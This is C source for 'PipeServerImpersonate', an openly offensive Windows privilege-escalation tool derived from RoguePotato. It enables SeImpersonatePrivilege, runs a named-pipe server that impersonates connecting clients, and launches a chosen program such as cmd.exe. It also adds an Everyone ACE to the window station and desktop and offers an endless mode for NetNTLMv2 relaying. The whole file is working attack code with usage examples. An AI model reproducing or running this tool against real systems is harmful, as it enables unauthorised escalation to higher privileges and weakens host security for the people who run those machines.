#include "Windows.h"
#include "stdio.h"
#include <time.h>
#include "common.h"

#pragma warning(disable : 4996) //_CRT_SECURE_NO_WARNINGS

//global variables
wchar_t* commandline = NULL;
wchar_t* arguments = NULL;
wchar_t* clsid_string;
char gPipeName[MAX_PATH];
bool endless = false;
wchar_t WinStationName[256];

//functions
void GenRandomString(char* s, const int len);
void SetWinDesktopPerms();


int wmain(int argc, wchar_t** argv)
{
	//init default values
	wchar_t* pipe_placeholder = (wchar_t*)PIPE_NAME;
	

	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{

		case 'e':
			++argv;
			--argc;
			commandline = argv[1];
			break;

		case 'p':
			++argv;
			--argc;
			pipe_placeholder = argv[1];
			break;

		case 'a':
			++argv;
			--argc;
			arguments = argv[1];
			break;

		case 'n':
			++argv;
			--argc;
			endless = true;
			break;

		case 'z':
			++argv;
			--argc;
			pipe_placeholder = NULL;
			break;

		case 'h':
			Usage();
			exit(100);
			break;

		default:
			wprintf(L"Wrong Argument: %s\n", argv[1]);
			Usage();
			exit(-1);
		}
		++argv;
		--argc;
	}

	if (commandline == NULL)
	{
		Usage();
		exit(-1);
	}

	
	
	printf("[+] Starting Pipeserver...\n");
	PipeServerImpersonate(commandline, pipe_placeholder, arguments);
	return 0;
}

void PipeServerImpersonate(wchar_t *commandline, wchar_t *pipe_placeholder, wchar_t* arguments) {
	DWORD threadId;
	wchar_t pipename[MAX_PATH];
	if (!EnablePriv(NULL, SE_IMPERSONATE_NAME))
	{
		wprintf(L"[-] A privilege is missing: '%ws'. Exiting ...\n", SE_IMPERSONATE_NAME);
		exit(-1);
	}
	
	SetWinDesktopPerms();

	
	if(pipe_placeholder == NULL)
		GenRandomString(gPipeName, 10);
	else
		wcstombs(gPipeName, pipe_placeholder, MAX_PATH-1);
	
	wsprintf(pipename, L"\\\\.\\pipe\\%S", gPipeName);
	CreatePipeServer(pipename, endless);	
}

void Usage()
{
	printf("\n\n\tPipeServerImpersonate\n\t@shitsecure, code stolen from @splinter_code's && @decoder_it's RoguePotato (https://github.com/antonioCoco/RoguePotato) \n\n\n");

	printf("Mandatory args: \n"
		"-e commandline: commandline of the program to launch\n"
	);

	printf("\n\n");
	printf("Optional args: \n"
		"-p pipename_placeholder: placeholder to be used in the pipe name creation (default: PipeServerImpersonate)\n"
		"-z : this flag will randomize the pipename_placeholder (don't use with -p)\n"
		"-a : arguments to run the binary with\n"
		"-n : endless mode - restart the Named Pipe Server after execution - can be used in combination with NetNTLMv2 relaying.\n"
	);

	printf("\n\n");
	printf("Example to execute cmd.exe and create a named pipe named testpipes: \n"
		"\tPipeServerImpersonate.exe -e \"C:\\windows\\system32\\cmd.exe\" -p testpipes\n"
	);
}

void GenRandomString(char* s, const int len)
{

	srand(time(NULL));
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	for (int i = 0; i < len; ++i) {
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	s[len] = 0;
}


void SetWinDesktopPerms()
{
	HWINSTA hwinstaold = GetProcessWindowStation();
	DWORD lengthNeeded;
	memset(WinStationName, 0, sizeof(WinStationName));
	GetUserObjectInformationW(hwinstaold, UOI_NAME, WinStationName, 256, &lengthNeeded);



	HWINSTA hwinsta = OpenWindowStationW(WinStationName, FALSE, READ_CONTROL | WRITE_DAC);

	if (!SetProcessWindowStation(hwinsta))
		printf("[-] Error SetProcessWindowStation:%d\n", GetLastError());

	HDESK hdesk = OpenDesktop(
		L"default",
		0,
		FALSE,
		READ_CONTROL | WRITE_DAC |
		DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS
	);
	if (hdesk == NULL)
		printf("[-] Error open Desktop:%d\n", GetLastError());
	if (!SetProcessWindowStation(hwinstaold))
		printf("[-] Error SetProcessWindowStation2:%d\n", GetLastError());


	PSID psid = BuildEveryoneSid();
	//printf("psid=%0x\n", psid);
	if (!AddTheAceWindowStation(hwinstaold, psid))
		printf("[-] Error add Ace Station:%d\n", GetLastError());
	if (!AddTheAceDesktop(hdesk, psid))
		printf("[-] Error add Ace desktop:%d\n", GetLastError());
	//free(psid);
	CloseWindowStation(hwinsta);

	CloseDesktop(hdesk);
}